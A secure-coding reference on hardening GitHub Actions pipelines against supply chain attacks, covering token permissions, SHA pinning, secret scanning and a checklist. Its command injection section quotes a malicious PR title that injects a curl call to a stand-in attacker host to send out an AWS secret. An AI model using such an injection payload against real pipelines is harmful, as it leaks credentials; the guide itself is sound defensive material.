# CI/CD Pipeline and Software Supply Chain Security

This reference defines standards to protect continuous integration workflows (GitHub Actions, GitLab CI) against software supply chain attacks.

---

## 1. Major Attack Vectors in CI/CD

- **Overprivileged Automated Tokens (`GITHUB_TOKEN`)**: Leaving tokens with global write access (`permissions: write-all`), enabling untrusted test scripts to modify branches, create releases, or access workflow secrets.
- **Workflow Script Command Injection**: Using untrusted user input within shell script execution blocks (`run: echo "PR title: ${{ github.event.pull_request.title }}"`).
- **Floating Action Tags (`@v1` / `@master`)**: If an action author's repository is hijacked, an attacker can retag `@v1` to point to malicious code that steals pipeline secrets.
- **Secret Leaks in CI Logs**: Printing all environment variables during debug runs (`env`, `printenv`).

---

## 2. Hardened GitHub Actions Workflow

```yaml
name: Secure CI Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# 1. Enforce strict least-privilege permissions globally
permissions:
  contents: read

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write # Required only for uploading SARIF reports

    steps:
      # 2. Pin third-party actions to full immutable commit SHAs
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

      - name: Setup Node.js
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: 20
          cache: 'npm'

      # 3. Deterministic installation from lockfile
      - name: Install dependencies
        run: npm ci

      # 4. Scan repository for leaked credentials
      - name: Detect leaked secrets
        uses: gitleaks/gitleaks-action@f9076f62b80145a0b73105ff7c9b83b4b88939c8 # v2.3.4
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # 5. Execute tests safely
      - name: Run Tests
        run: npm test
```

---

## 3. Command Injection Prevention in Workflow Steps

**Insecure:**
```yaml
# INSECURE: A PR title like `test"; curl https://evil.com/leak?k=$AWS_SECRET; echo "` executes
- name: Log PR Title
  run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

**Secure (Passed via environment variables):**
```yaml
# SECURE: Environment variables neutralize shell evaluation
- name: Log PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Processing PR: $PR_TITLE"
```

---

## 4. CI/CD Security Checklist

- [ ] Workflows declare explicit least-privilege `permissions:` at root.
- [ ] Third-party actions pinned to immutable commit SHA hashes.
- [ ] Deterministic commands (`npm ci`, `poetry install --frozen`) used instead of dynamic installs.
- [ ] Untrusted context expressions (`github.event.*`) are never concatenated into `run:` blocks.
- [ ] Pipeline includes secrets scanning (`gitleaks`) and dependency vulnerability checks (`trivy`/`osv-scanner`).
